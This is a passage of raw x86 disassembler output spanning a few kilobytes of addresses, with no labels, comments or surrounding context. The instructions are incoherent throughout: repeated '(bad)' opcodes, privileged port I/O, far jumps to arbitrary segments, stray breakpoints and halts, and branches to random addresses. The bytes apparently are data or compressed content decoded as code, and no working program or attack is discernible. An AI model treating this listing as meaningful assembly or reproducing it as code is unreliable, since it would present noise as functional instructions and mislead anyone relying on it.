  6b563d:	out    0x58,eax
  6b563f:	jmp    0x8d3b76ba
  6b5644:	jb     0x6b568e
  6b5646:	repz jns 0x6b55eb
  6b5649:	mov    ebp,0x5941d157
  6b564e:	int3   
  6b564f:	inc    edi
  6b5650:	jb     0x6b56c0
  6b5652:	inc    ebx
  6b5653:	js     0x6b569f
  6b5655:	inc    esp
  6b5656:	cmp    BYTE PTR [ebx],bh
  6b5658:	cwde   
  6b5659:	mov    cl,0xad
  6b565b:	jb     0x6b56d9
  6b565d:	inc    ebp
  6b565e:	cdq    
  6b565f:	xchg   esi,eax
  6b5660:	enter  0xa8ca,0xe3
  6b5664:	stos   BYTE PTR es:[edi],al
  6b5665:	jo     0x6b567d
  6b5667:	(bad)  
  6b5669:	(bad)  
  6b566a:	stos   DWORD PTR es:[edi],eax
  6b566b:	retf   
  6b566c:	jecxz  0x6b568c
  6b566e:	pop    ecx
  6b566f:	push   edi
  6b5670:	adc    DWORD PTR [ebp+0x427113c7],ecx
  6b5676:	pop    DWORD PTR gs:[edx]
  6b5679:	jnp    0x6b56e7
  6b567b:	adc    ebx,DWORD PTR cs:[ecx-0xc0dd715]
  6b5682:	sbb    eax,0xf61802f0
  6b5687:	xchg   ebp,eax
  6b5688:	adc    al,0xe3
  6b568a:	jge    0x6b569f
  6b568c:	test   ebx,edi
  6b568e:	inc    esi
  6b568f:	es add ecx,edx
  6b5692:	gs retf 
  6b5694:	jge    0x6b569b
  6b5696:	mov    dh,0x19
  6b5698:	ja     0x6b562a
  6b569a:	ret    0xb69
  6b569d:	mov    ebp,DWORD PTR [esi-0x38c257a5]
  6b56a3:	sub    dl,ch
  6b56a5:	dec    ebp
  6b56a6:	push   eax
  6b56a7:	gs loopne 0x6b5638
  6b56aa:	sub    DWORD PTR [ebp+0x2ee21529],0x1b267fbe
  6b56b4:	iret   
  6b56b5:	(bad)  
  6b56b6:	imul   ebx,DWORD PTR [ebx+0x79fe6516],0x29
  6b56bd:	dec    ecx
  6b56be:	mov    ebx,0xd3de602f
  6b56c3:	in     al,dx
  6b56c4:	call   0xf747701f
  6b56c9:	and    DWORD PTR [ebx],esi
  6b56cb:	sub    BYTE PTR [edx+eax*2],0xe1
  6b56cf:	pop    edx
  6b56d0:	aam    0x58
  6b56d2:	dec    eax
  6b56d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b56d4:	bound  edi,QWORD PTR [edi+edi*8]
  6b56d7:	jb     0x6b574b
  6b56d9:	dec    edx
  6b56da:	inc    ecx
  6b56db:	push   esi
  6b56dc:	imul   edx,edi,0xba1ee15f
  6b56e2:	mov    dh,0x36
  6b56e4:	aad    0x2b
  6b56e6:	push   ebx
  6b56e7:	jecxz  0x6b56ba
  6b56e9:	jno    0x6b5752
  6b56eb:	shr    BYTE PTR [edx+ecx*4+0x56],1
  6b56ef:	lea    ebx,[edx-0x27]
  6b56f2:	ret    
  6b56f3:	push   ebx
  6b56f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b56f5:	mov    ah,0x6a
  6b56f7:	outs   dx,DWORD PTR ds:[esi]
  6b56f8:	rcr    DWORD PTR [edi-0x75],1
  6b56fb:	sub    al,0x9d
  6b56fd:	lods   al,BYTE PTR ds:[esi]
  6b56fe:	inc    edi
  6b56ff:	adc    ecx,0x3d
  6b5702:	in     al,dx
  6b5703:	nop
  6b5704:	imul   dh
  6b5706:	cs push eax
  6b5708:	jae    0x6b5750
  6b570a:	sub    eax,0x459bea9f
  6b570f:	fcomp  DWORD PTR [eax-0x155de53e]
  6b5715:	daa    
  6b5716:	xor    BYTE PTR [esi-0x73],0xcb
  6b571a:	push   es
  6b571b:	test   BYTE PTR [ebx+ebp*8+0x7],al
  6b571f:	mov    bh,0xce
  6b5721:	mov    dh,0x91
  6b5723:	aaa    
  6b5724:	test   DWORD PTR [esi+0x64],0x912ee0fe
  6b572b:	imul   ebx,DWORD PTR [ebp+ebp*1+0x30],0x11
  6b5730:	dec    ebp
  6b5731:	fisub  WORD PTR [ecx+esi*1+0x79]
  6b5735:	retf   
  6b5736:	lods   al,BYTE PTR ds:[esi]
  6b5737:	rcl    BYTE PTR [edi],cl
  6b5739:	retf   0xfcf7
  6b573c:	jo     0x6b5716
  6b573e:	mov    esp,DWORD PTR [ebp+ebp*4-0x6e]
  6b5742:	rep outs dx,DWORD PTR ds:[esi]
  6b5744:	sbb    BYTE PTR [esi+esi*1+0x22d4c2b3],dh
  6b574b:	into   
  6b574c:	in     al,0x74
  6b574e:	outs   dx,DWORD PTR ds:[esi]
  6b574f:	stc    
  6b5750:	int    0x3a
  6b5752:	jae    0x6b5718
  6b5754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b5755:	adc    eax,0xe6b96e06
  6b575a:	cmp    dl,BYTE PTR [edx+0x3]
  6b575d:	leave  
  6b575e:	ret    0x2297
  6b5761:	jae    0x6b570f
  6b5763:	inc    edi
  6b5764:	jmp    0xf2635cfc
  6b5769:	inc    esi
  6b576a:	ja     0x6b57e4
  6b576c:	enter  0xc196,0xaa
  6b5770:	cmp    DWORD PTR [ebp+0x6684c666],esi
  6b5776:	ror    DWORD PTR [edx],cl
  6b5778:	mov    dh,0x78
  6b577a:	iret   
  6b577b:	dec    ebx
  6b577c:	cld    
  6b577d:	es mov ecx,0xfe9b61e3
  6b5783:	test   al,0xc
  6b5785:	sbb    DWORD PTR [edi],0x68
  6b5788:	jg     0x6b5736
  6b578a:	dec    esi
  6b578b:	fst    st(2)
  6b578d:	dec    ebp
  6b578e:	int3   
  6b578f:	cmc    
  6b5790:	es rcr ebp,0xdf
  6b5794:	and    al,0x39
  6b5796:	mov    ds:0x590b6011,eax
  6b579b:	jmp    0x333c000d
  6b57a0:	fisttp WORD PTR [esp+edi*2-0x69]
  6b57a4:	mov    bl,BYTE PTR [ebp-0x7d]
  6b57a7:	or     dl,BYTE PTR [ebx-0x28]
  6b57aa:	out    dx,al
  6b57ab:	cli    
  6b57ac:	sub    DWORD PTR [esi+edx*2-0x75],ecx
  6b57b0:	std    
  6b57b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b57b2:	pop    esi
  6b57b3:	mov    ch,0xd6
  6b57b5:	je     0x6b574c
  6b57b7:	push   0xcee6023e
  6b57bc:	xor    dh,BYTE PTR [ebp+edx*8-0x72a81e02]
  6b57c3:	xchg   edi,eax
  6b57c4:	mov    bh,0xf
  6b57c6:	push   eax
  6b57c7:	dec    esi
  6b57c8:	shl    DWORD PTR ds:0xec7963d0,cl
  6b57ce:	leave  
  6b57cf:	ins    DWORD PTR es:[edi],dx
  6b57d0:	popf   
  6b57d1:	dec    ebx
  6b57d2:	or     esp,edi
  6b57d4:	sub    dl,BYTE PTR [edx]
  6b57d6:	and    eax,0x7024b34b
  6b57db:	test   al,0xf4
  6b57dd:	test   eax,0x39275dc1
  6b57e2:	or     esi,ecx
  6b57e4:	mov    bl,0x89
  6b57e6:	and    al,BYTE PTR [ebx+0x562c1f3e]
  6b57ec:	or     al,0x17
  6b57ee:	test   eax,0xc335cec4
  6b57f3:	and    eax,edi
  6b57f5:	leave  
  6b57f6:	stos   DWORD PTR es:[edi],eax
  6b57f7:	mov    dh,0xa1
  6b57f9:	ror    edx,0x7
  6b57fc:	sbb    al,bl
  6b57fe:	gs mov fs:0xcce78ea,eax
  6b5805:	scas   al,BYTE PTR es:[edi]
  6b5806:	data16 jno 0x6b5840
  6b5809:	xchg   ebx,eax
  6b580a:	jno    0x6b5801
  6b580c:	mov    eax,ds:0xcf178bfb
  6b5811:	leave  
  6b5812:	fucomi st,st(6)
  6b5814:	xchg   esi,eax
  6b5815:	push   ebp
  6b5816:	mov    esi,0xe092a614
  6b581b:	test   al,0xd1
  6b581d:	data16 mov al,0xb4
  6b5820:	stos   BYTE PTR es:[edi],al
  6b5821:	ins    DWORD PTR es:[edi],dx
  6b5822:	xor    eax,0x12452864
  6b5827:	adc    ch,al
  6b5829:	in     al,dx
  6b582a:	pushf  
  6b582b:	pusha  
  6b582c:	(bad)  
  6b582d:	pop    edi
  6b582e:	sbb    al,0x3c
  6b5830:	cld    
  6b5831:	ret    0xa472
  6b5834:	out    0x43,al
  6b5836:	cld    
  6b5837:	fadd   QWORD PTR [eax]
  6b5839:	or     DWORD PTR [esi-0x7f],edx
  6b583c:	mov    ss,WORD PTR [edi]
  6b583e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b583f:	aas    
  6b5840:	jbe    0x6b5871
  6b5842:	test   dl,dh
  6b5844:	retf   
  6b5845:	xchg   ebp,eax
  6b5846:	dec    esp
  6b5847:	jge    0x6b58b2
  6b5849:	cmp    BYTE PTR [eax+eiz*4-0x1135891f],0x1f
  6b5851:	xchg   esi,eax
  6b5852:	push   0x1b71dad
  6b5857:	ja     0x6b58ba
  6b5859:	cmp    al,BYTE PTR ds:0x8334d02d
  6b585f:	inc    ecx
  6b5860:	cs retf 
  6b5862:	fst    QWORD PTR [eax-0x19f57c11]
  6b5868:	xor    al,0xac
  6b586a:	aaa    
  6b586b:	or     eax,0xdabf7ab
  6b5870:	lods   eax,DWORD PTR ds:[esi]
  6b5871:	mov    esp,ecx
  6b5873:	pop    ebx
  6b5874:	sub    BYTE PTR [ebp-0x13],al
  6b5877:	or     bl,BYTE PTR [ebx]
  6b5879:	ins    DWORD PTR es:[edi],dx
  6b587a:	jecxz  0x6b58e7
  6b587c:	mov    dh,0xb9
  6b587e:	and    eax,0x30b05556
  6b5883:	fst    QWORD PTR [esi-0x263c78cc]
  6b5889:	xchg   edx,eax
  6b588a:	mov    ebx,0xe5f8e53b
  6b588f:	mov    ds:0x5e58ee1d,eax
  6b5894:	(bad)  
  6b5895:	fistp  WORD PTR [edx+0x7dce0982]
  6b589b:	cmp    DWORD PTR [esi-0x20],0x50
  6b589f:	push   ss
  6b58a0:	outs   dx,DWORD PTR ds:[esi]
  6b58a1:	cli    
  6b58a2:	les    edi,FWORD PTR [edx]
  6b58a4:	mov    ah,0x8a
  6b58a6:	dec    edx
  6b58a7:	jb     0x6b5868
  6b58a9:	repz sbb eax,0xfdaa7e31
  6b58af:	pop    eax
  6b58b0:	mov    ds:0x51492e3c,eax
  6b58b5:	aam    0xab
  6b58b7:	mov    dh,0x2e
  6b58b9:	sbb    al,0xd6
  6b58bb:	push   esi
  6b58bc:	inc    eax
  6b58bd:	scas   al,BYTE PTR es:[edi]
  6b58be:	push   0x10
  6b58c0:	pop    ss
  6b58c1:	icebp  
  6b58c2:	and    bl,BYTE PTR [ebx+esi*8+0x4424dc3b]
  6b58c9:	add    BYTE PTR [edx-0x32449266],dl
  6b58cf:	pop    edi
  6b58d0:	xchg   ecx,eax
  6b58d1:	inc    edi
  6b58d2:	cld    
  6b58d3:	arpl   WORD PTR [ecx-0xd6bc89],bx
  6b58d9:	rol    BYTE PTR [ebx+0x52],1
  6b58dc:	xor    bl,dl
  6b58de:	test   al,0xeb
  6b58e0:	jno    0x6b5924
  6b58e2:	dec    ecx
  6b58e3:	cmp    BYTE PTR [ebx],dl
  6b58e5:	mov    ah,0xff
  6b58e7:	push   ds
  6b58e8:	pop    esp
  6b58e9:	lahf   
  6b58ea:	jbe    0x6b58b7
  6b58ec:	xor    BYTE PTR [esi+0x2e59a8db],cl
  6b58f2:	imul   eax,DWORD PTR [ebx],0x26966cce
  6b58f8:	neg    bl
  6b58fa:	rol    dl,cl
  6b58fc:	xchg   DWORD PTR [eax-0x62],ebx
  6b58ff:	dec    ebx
  6b5900:	sbb    bh,dl
  6b5902:	pop    ebp
  6b5903:	rcl    BYTE PTR [edi+0x487d7e0d],1
  6b5909:	mov    al,ds:0x7be46264
  6b590e:	(bad)  
  6b590f:	mov    eax,0x93fc7b3d
  6b5914:	jge    0x6b58a5
  6b5916:	fisttp DWORD PTR [esi+0x6e86a0cb]
  6b591c:	jno    0x6b5915
  6b591e:	inc    eax
  6b591f:	jmp    0xcee1:0x40cc3e16
  6b5926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b5927:	mov    bl,0x88
  6b5929:	or     dl,ch
  6b592b:	ds pop ebx
  6b592d:	lods   al,BYTE PTR ds:[esi]
  6b592e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b592f:	jae    0x6b5936
  6b5931:	call   0xe5001eca
  6b5936:	sbb    BYTE PTR [ecx],cl
  6b5938:	addr16 pop ecx
  6b593a:	mov    dh,0x16
  6b593c:	jl     0x6b594b
  6b593e:	(bad)  
  6b593f:	mov    ds:0xaf227e1b,eax
  6b5944:	cmp    ah,BYTE PTR [ebx+0x33aae430]
  6b594a:	outs   dx,BYTE PTR ds:[esi]
  6b594b:	fdivr  QWORD PTR [ebx]
  6b594d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b594e:	sar    cl,cl
  6b5950:	ret    
  6b5951:	mov    edx,0x24088bd1
  6b5956:	pop    ecx
  6b5957:	push   0xf8baec5c
  6b595c:	dec    ecx
  6b595d:	das    
  6b595e:	loopne 0x6b5937
  6b5960:	or     eax,0xea542f6c
  6b5965:	sub    al,bh
  6b5967:	and    DWORD PTR [ebx+0x3e68bdd6],0x60
  6b596e:	jne    0x6b5946
  6b5970:	cmc    
  6b5971:	ret    0x9247
  6b5974:	int    0x84
  6b5976:	sub    dl,BYTE PTR [ebx]
  6b5978:	cmp    eax,0xd52eb316
  6b597d:	(bad)  
  6b597e:	aas    
  6b597f:	jle    0x6b59f1
  6b5981:	int3   
  6b5982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b5983:	pop    edx
  6b5984:	bound  ebp,QWORD PTR [ebx+ebp*8-0x60]
  6b5988:	add    ebp,DWORD PTR [edx+0x22e4bb5d]
  6b598e:	std    
  6b598f:	(bad)  
  6b5990:	dec    ebp
  6b5991:	sti    
  6b5992:	push   cs
  6b5993:	push   eax
  6b5994:	and    dl,ah
  6b5996:	lock call 0xde5e:0xf898a234
  6b599e:	sbb    al,dh
  6b59a0:	outs   dx,DWORD PTR ds:[esi]
  6b59a1:	and    BYTE PTR [edx-0x2d18379c],al
  6b59a7:	imul   edi,DWORD PTR gs:[esi+0x31f42d58],0x468d55df
  6b59b2:	cmp    dh,BYTE PTR ss:[ebp+0xe]
  6b59b6:	imul   esp,DWORD PTR ds:0x38104f78,0x577541bb
  6b59c0:	adc    DWORD PTR [esi+0x23e1b01f],0xc37e8b8a
  6b59ca:	cmc    
  6b59cb:	sbb    ebx,DWORD PTR [esp+ebx*8+0x1d]
  6b59cf:	shl    edi,1
  6b59d1:	jge    0x6b5a3d
  6b59d3:	adc    DWORD PTR ds:0xcb2ce6cc,edi
  6b59d9:	in     eax,0x55
  6b59db:	hlt    
  6b59dc:	retf   0xdb0c
  6b59df:	pop    ebx
  6b59e0:	adc    DWORD PTR [ebx],edx
  6b59e2:	pop    esi
  6b59e3:	cmp    BYTE PTR [eax-0x15],dl
  6b59e6:	sbb    ah,0xe0
  6b59e9:	push   esp
  6b59ea:	int3   
  6b59eb:	iret   
  6b59ec:	sbb    al,0x4e
  6b59ee:	inc    ebx
  6b59ef:	or     eax,0x8b375c9d
  6b59f4:	mov    ch,ah
  6b59f6:	(bad)  
  6b59f7:	push   cs
  6b59f8:	adc    DWORD PTR [esp+ecx*4+0x4b],edi
  6b59fc:	xor    al,dl
  6b59fe:	retf   
  6b59ff:	(bad)  
  6b5a00:	xor    ebx,DWORD PTR [edi+0x7269f8f4]
  6b5a06:	std    
  6b5a07:	lods   eax,DWORD PTR ds:[esi]
  6b5a08:	add    DWORD PTR [edx-0x3a],eax
  6b5a0b:	cs ret 0x61e6
  6b5a0f:	sahf   
  6b5a10:	push   esi
  6b5a11:	imul   ecx,esp,0xffffffb8
  6b5a14:	or     esi,ebp
  6b5a16:	xor    dh,BYTE PTR [eax]
  6b5a18:	(bad)  
  6b5a19:	xchg   ecx,eax
  6b5a1a:	(bad)  
  6b5a1b:	rcl    DWORD PTR [edx+0x31abd9ca],0x84
  6b5a22:	stos   BYTE PTR es:[edi],al
  6b5a23:	cmc    
  6b5a24:	int    0xea
  6b5a26:	jne    0x6b5a2e
  6b5a28:	cmp    dl,BYTE PTR [ecx+0x12]
  6b5a2b:	out    0xc0,al
  6b5a2d:	int    0x46
  6b5a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b5a30:	ja     0x6b59c6
  6b5a32:	call   0x1070f7d1
  6b5a37:	cdq    
  6b5a38:	mov    DWORD PTR [edi+0x18],esi
  6b5a3b:	xor    ebx,DWORD PTR [ebp+0x5b]
  6b5a3e:	jne    0x6b59d4
  6b5a40:	push   esi
  6b5a41:	and    al,0xc4
  6b5a43:	loope  0x6b5a13
  6b5a45:	pop    es
  6b5a46:	rcl    BYTE PTR [esi-0x808ae0],cl
  6b5a4c:	loop   0x6b5a50
  6b5a4e:	xchg   esp,eax
  6b5a4f:	in     ax,dx
  6b5a51:	lahf   
  6b5a52:	test   BYTE PTR [eax-0x41f651cb],bh
  6b5a58:	ss dec ecx
  6b5a5a:	out    0xec,eax
  6b5a5c:	or     ebp,DWORD PTR [bx+0x64]
  6b5a60:	das    
  6b5a61:	jmp    0x268a6ee9
  6b5a66:	pop    ebx
  6b5a67:	popf   
  6b5a68:	adc    BYTE PTR [ebx+0x59705220],ch
  6b5a6e:	dec    BYTE PTR [eax-0x3a]
  6b5a71:	pop    es
  6b5a72:	xchg   BYTE PTR [ecx+edi*8],dh
  6b5a75:	loop   0x6b5a09
  6b5a77:	pop    ebp
  6b5a78:	jae    0x6b5ac7
  6b5a7a:	pop    ecx
  6b5a7b:	cwde   
  6b5a7c:	mov    edi,0x739fa297
  6b5a81:	out    dx,eax
  6b5a82:	in     al,0xad
  6b5a84:	inc    esi
  6b5a85:	sahf   
  6b5a86:	inc    esp
  6b5a87:	fimul  DWORD PTR [eax+0x3429ad12]
  6b5a8d:	mov    ebx,0x30ad19ec
  6b5a92:	xor    al,0x63
  6b5a94:	out    dx,eax
  6b5a95:	cmp    eax,0x606f22ba
  6b5a9a:	shl    DWORD PTR [ecx],0x51
  6b5a9d:	jbe    0x6b5ae9
  6b5a9f:	clc    
  6b5aa0:	add    eax,0x6cdd1c8c
  6b5aa5:	ret    0x2fbe
  6b5aa8:	adc    al,0x16
  6b5aaa:	jns    0x6b5a60
  6b5aac:	pop    ecx
  6b5aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b5aae:	or     dh,dh
  6b5ab0:	sub    al,BYTE PTR [edx+edi*1+0x5d01f01b]
  6b5ab7:	adc    ecx,ebx
  6b5ab9:	and    eax,0x9476ddc7
  6b5abe:	xchg   ecx,eax
  6b5abf:	sar    BYTE PTR [edi-0x48],cl
  6b5ac2:	xor    edx,DWORD PTR [esi]
  6b5ac4:	xchg   ebx,esi
  6b5ac6:	(bad)  
  6b5ac7:	sub    eax,0x35f7ab8e
  6b5acc:	(bad)  [ebp+edx*2+0x1a]
  6b5ad0:	add    bh,BYTE PTR [edi+0x1f]
  6b5ad3:	sti    
  6b5ad4:	push   0x264b2976
  6b5ad9:	adc    DWORD PTR [edi+0x58eb6ca7],ebp
  6b5adf:	pop    ds
  6b5ae0:	sar    ah,1
  6b5ae2:	shr    BYTE PTR [eax+eiz*2-0x56],1
  6b5ae6:	pop    edx
  6b5ae7:	(bad)  
  6b5ae8:	pop    ds
  6b5ae9:	inc    esp
  6b5aea:	das    
  6b5aeb:	mov    edx,0xc4dfb74f
  6b5af0:	dec    esi
  6b5af1:	fdiv   st(3),st
  6b5af3:	jl     0x6b5af2
  6b5af5:	and    eax,0xd879f50d
  6b5afa:	call   FWORD PTR [edi-0x41]
  6b5afd:	mov    eax,es
  6b5aff:	lods   eax,DWORD PTR ds:[esi]
  6b5b00:	pop    ebp
  6b5b01:	fdivr  QWORD PTR [edi]
  6b5b03:	pop    ds
  6b5b04:	or     BYTE PTR [esi-0x3b6d8ef],ah
  6b5b0a:	lods   eax,DWORD PTR ds:[esi]
  6b5b0b:	sar    DWORD PTR [esi+ebx*4],0x37
  6b5b0f:	inc    esp
  6b5b10:	push   ecx
  6b5b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b5b12:	mov    ecx,0x3c281440
  6b5b17:	mov    ecx,0x19f42e25
  6b5b1c:	push   edx
  6b5b1d:	les    edi,FWORD PTR [edx+0x15]
  6b5b20:	icebp  
  6b5b21:	inc    ebx
  6b5b22:	xchg   esp,eax
  6b5b23:	mov    bl,0xe4
  6b5b25:	jle    0x6b5b3f
  6b5b27:	out    0x82,al
  6b5b29:	jge    0x6b5b5a
  6b5b2b:	inc    edi
  6b5b2c:	push   edi
  6b5b2d:	or     ebx,DWORD PTR [ecx+0x202bf8f8]
  6b5b33:	pop    ebp
  6b5b34:	loop   0x6b5af7
  6b5b36:	stos   BYTE PTR es:[edi],al
  6b5b37:	and    DWORD PTR [ebp+0x1866e0e7],ebx
  6b5b3d:	add    cl,BYTE PTR [eax]
  6b5b3f:	aam    0x4a
  6b5b41:	sti    
  6b5b42:	jae    0x6b5bc1
  6b5b44:	gs push ds
  6b5b46:	and    cl,BYTE PTR [ebx]
  6b5b48:	outs   dx,DWORD PTR ds:[esi]
  6b5b49:	inc    edi
  6b5b4a:	ss leave 
  6b5b4c:	cmp    esp,DWORD PTR [eax-0x65]
  6b5b4f:	dec    eax
  6b5b50:	aam    0x26
  6b5b52:	mov    edi,0x8fcfcfc0
  6b5b57:	jmp    0x7dc2:0x97326f2e
  6b5b5e:	and    al,0xdf
  6b5b60:	pop    eax
  6b5b61:	pop    ebp
  6b5b62:	xchg   DWORD PTR [esi-0x3],ebp
  6b5b65:	jge    0x6b5b76
  6b5b67:	inc    edi
  6b5b68:	js     0x6b5af8
  6b5b6a:	fstp   QWORD PTR [eax-0x2c6409ec]
  6b5b70:	ffree  st(2)
  6b5b72:	pop    ebx
  6b5b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b5b74:	push   ecx
  6b5b75:	hlt    
  6b5b76:	ret    
  6b5b77:	leave  
  6b5b78:	retf   
  6b5b79:	sub    DWORD PTR [esi-0x765e7c1],ecx
  6b5b7f:	sbb    ecx,0xfffffff9
  6b5b82:	ret    0x7f62
  6b5b85:	iret   
  6b5b86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b5b87:	cdq    
  6b5b88:	into   
  6b5b89:	in     eax,0x10
  6b5b8b:	or     DWORD PTR [eax-0x33],0xffffff8f
  6b5b8f:	out    dx,al
  6b5b90:	adc    edi,DWORD PTR [eax+0x683038ab]
  6b5b96:	in     eax,0x5b
  6b5b98:	inc    ebx
  6b5b99:	push   esp
  6b5b9a:	je     0x6b5b30
  6b5b9c:	add    eax,0x1ae192d8
  6b5ba1:	mul    DWORD PTR ds:0x2bdb8c3c
  6b5ba7:	ja     0x6b5bfb
  6b5ba9:	pop    ss
  6b5baa:	ret    0x23e6
  6b5bad:	and    al,0x25
  6b5baf:	mov    edi,0xaa778224
  6b5bb4:	fmul   QWORD PTR [ebx]
  6b5bb6:	popa   
  6b5bb7:	iret   
  6b5bb8:	loope  0x6b5bb8
  6b5bba:	sub    DWORD PTR [esi-0x19],0xbd224c22
  6b5bc1:	test   al,ch
  6b5bc3:	cmp    ebx,eax
  6b5bc5:	(bad)  
  6b5bc6:	mov    ebp,0xed1ed4fb
  6b5bcb:	pushf  
  6b5bcc:	rol    BYTE PTR [eax+0x157db4b9],0x18
  6b5bd3:	test   eax,0x7a19ca65
  6b5bd8:	lods   eax,DWORD PTR ds:[esi]
  6b5bd9:	cmp    eax,0x8d4f28a1
  6b5bde:	inc    ebx
  6b5bdf:	xchg   edi,eax
  6b5be0:	sub    bl,BYTE PTR [eax+eiz*8]
  6b5be3:	fwait
  6b5be4:	aad    0x81
  6b5be6:	ror    DWORD PTR [ebx-0x65],cl
  6b5be9:	inc    edx
  6b5bea:	jp     0x6b5bdd
  6b5bec:	or     eax,0x716b146b
  6b5bf1:	sbb    eax,0xc901c370
  6b5bf6:	mov    ebx,0x98692dbb
  6b5bfb:	rcl    BYTE PTR [esi+0x7a],0xda
  6b5bff:	jae    0x6b5c74
  6b5c01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b5c02:	iret   
  6b5c03:	push   ebx
  6b5c04:	inc    ebx
  6b5c05:	aad    0xb7
  6b5c07:	push   ss
  6b5c08:	sub    al,0xd3
  6b5c0a:	imul   ebp,edi,0x4e
  6b5c0d:	aas    
  6b5c0e:	jo     0x6b5ba1
  6b5c10:	inc    edi
  6b5c11:	and    al,0x6b
  6b5c13:	retf   0xf5fc
  6b5c16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b5c17:	xor    ecx,DWORD PTR fs:[esi]
  6b5c1a:	jmp    0x6b5c26
  6b5c1c:	xchg   edx,eax
  6b5c1d:	nop
  6b5c1e:	jne    0x6b5bae
  6b5c20:	gs das 
  6b5c22:	sahf   
  6b5c23:	int    0x5b
  6b5c25:	add    al,0xb6
  6b5c27:	jo     0x6b5bcd
  6b5c29:	mov    ah,0xc9
  6b5c2b:	jmp    0x56a6:0xeacc8d52
  6b5c32:	pop    edx
  6b5c33:	jo     0x6b5be0
  6b5c35:	adc    DWORD PTR [esi-0x5],edi
  6b5c38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b5c39:	or     DWORD PTR [edx],ecx
  6b5c3b:	sbb    DWORD PTR [edx-0x20],edi
  6b5c3e:	pop    ebp
  6b5c3f:	add    eax,DWORD PTR [edi+0x35]
  6b5c42:	cmp    DWORD PTR [ebx+0x2230f37b],edx
  6b5c48:	sbb    DWORD PTR [ebx-0x35],eax
  6b5c4b:	fdiv   QWORD PTR [eax-0xa]
  6b5c4e:	xor    BYTE PTR [ecx-0x1f],dh
  6b5c51:	mov    ebp,0x1c8230a3
  6b5c56:	xor    edx,DWORD PTR [eax]
  6b5c58:	mov    eax,DWORD PTR [ebx+eax*4-0x157a0bc]
  6b5c5f:	xor    cl,BYTE PTR [edi]
  6b5c61:	ins    DWORD PTR es:[edi],dx
  6b5c62:	mov    cx,0x36a7
  6b5c66:	lea    edx,[edi]
  6b5c68:	jne    0x6b5ca7
  6b5c6a:	inc    ebp
  6b5c6b:	cdq    
  6b5c6c:	test   al,0x78
  6b5c6e:	popa   
  6b5c6f:	sub    BYTE PTR [edi],bh
  6b5c71:	das    
  6b5c72:	lds    esp,FWORD PTR [eax+0x6ea81355]
  6b5c78:	adc    ebx,DWORD PTR [eax+0x7]
  6b5c7b:	ror    DWORD PTR [ecx],cl
  6b5c7d:	(bad)  
  6b5c7e:	dec    eax
  6b5c7f:	test   DWORD PTR [esi],esp
  6b5c81:	mov    ecx,0x29c2a61f
  6b5c86:	test   al,0x54
  6b5c88:	addr16 pop eax
  6b5c8a:	retf   
  6b5c8b:	mov    gs,WORD PTR [ecx+0x73dc0129]
  6b5c91:	fidivr WORD PTR [ebp+0x3db00384]
  6b5c97:	mov    al,0xf5
  6b5c99:	loope  0x6b5c65
  6b5c9b:	fidivr WORD PTR [ebx+0x59]
  6b5c9e:	sub    al,0xca
  6b5ca0:	popa   
  6b5ca1:	adc    BYTE PTR ds:[edx+0x33],ah
  6b5ca5:	dec    ebp
  6b5ca6:	retf   
  6b5ca7:	(bad)  
  6b5ca8:	xchg   esp,eax
  6b5ca9:	mov    al,ds:0xe736da95
  6b5cae:	(bad)  
  6b5caf:	sbb    BYTE PTR [ecx-0x28],bh
  6b5cb2:	mov    ah,0x4a
  6b5cb4:	loope  0x6b5ce4
  6b5cb6:	js     0x6b5c4b
  6b5cb8:	mov    cl,bh
  6b5cba:	mov    ecx,0x9dc4f180
  6b5cbf:	and    ebp,DWORD PTR [esp+eiz*8-0x691f2a48]
  6b5cc6:	mov    edi,0xaded92b2
  6b5ccb:	mov    ds:0xbf45b228,al
  6b5cd0:	mov    BYTE PTR [eax-0x2d],dl
  6b5cd3:	add    cl,cl
  6b5cd5:	call   0x8e5d6478
  6b5cda:	add    esp,DWORD PTR [edx+0x7a800994]
  6b5ce0:	loope  0x6b5ca1
  6b5ce2:	idiv   DWORD PTR [ecx+0x1c]
  6b5ce5:	jnp    0x6b5ce5
  6b5ce7:	xchg   ebx,eax
  6b5ce8:	ret    0x1483
  6b5ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b5cec:	lahf   
  6b5ced:	sub    DWORD PTR [ebx],ebx
  6b5cef:	sar    DWORD PTR [esi-0x964456b],1
  6b5cf5:	shl    BYTE PTR [edx-0x5daaf6fd],0xbd
  6b5cfc:	xchg   edi,eax
  6b5cfd:	mov    dl,cl
  6b5cff:	sub    DWORD PTR [eax-0x59936657],edx
  6b5d05:	jns    0x6b5d5b
  6b5d07:	cmp    DWORD PTR [eax-0x24b3507d],0x3d3e221d
  6b5d11:	lahf   
  6b5d12:	adc    BYTE PTR [eax-0x7355ffbb],0x96
  6b5d19:	aam    0xd
  6b5d1b:	gs mov ebx,0x44897571
  6b5d21:	loope  0x6b5d0d
  6b5d23:	push   ebx
  6b5d24:	sbb    esi,DWORD PTR [edi-0x505a6c67]
  6b5d2a:	push   edi
  6b5d2b:	pop    edi
  6b5d2c:	repz push ss
  6b5d2e:	jge    0x6b5ceb
  6b5d30:	mov    cl,0x4f
  6b5d32:	ret    0x3efe
  6b5d35:	lahf   
  6b5d36:	push   ebx
  6b5d37:	mov    ecx,0x2b904b0b
  6b5d3c:	sbb    dl,bh
  6b5d3e:	adc    ebx,edi
  6b5d40:	or     ebx,DWORD PTR [ebx+0x36a9ad50]
  6b5d46:	jb     0x6b5da4
  6b5d48:	out    0x13,eax
  6b5d4a:	jle    0x6b5d9d
